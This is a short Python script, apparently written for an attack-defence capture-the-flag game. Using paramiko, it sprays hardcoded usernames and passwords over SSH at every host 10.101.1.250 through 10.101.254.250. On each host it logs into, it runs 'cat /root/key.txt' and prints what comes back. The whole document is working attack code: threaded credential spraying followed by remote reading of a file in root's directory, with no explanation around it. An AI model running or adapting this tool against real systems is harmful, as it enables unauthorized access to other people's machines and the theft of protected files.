#-*- coding: utf-8 -*-
#!/usr/bin/python
import paramiko
import threading
def ssh2(ip,username,password,cmd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,22,username,password,timeout=3)
        #ssh.connect(ip,22,username,passwd,timeout=50)
        for m in cmd:
            stdin, stdout, stderr = ssh.exec_command(m)
            # stdin.write("Y")
            out = stdout.readlines()
            for o in out:
            #print o,
		print(o+"("+ip+")"+"\n")
        ssh.close()
    except:
        pass
if __name__=='__main__':
    cmd = ["cat /root/key.txt"]
    usernames = ['admin','guest']
    passwords = ['2ac1a2', 'c2cbb3'] 
    threads = [100]
    for username in usernames:
        for password in passwords:
            for i in range(1, 255): 
                ip = "10.101.%s.250"%i  
                zt = threading.Thread(target=ssh2, args=(ip, username, password, cmd))
                zt.start()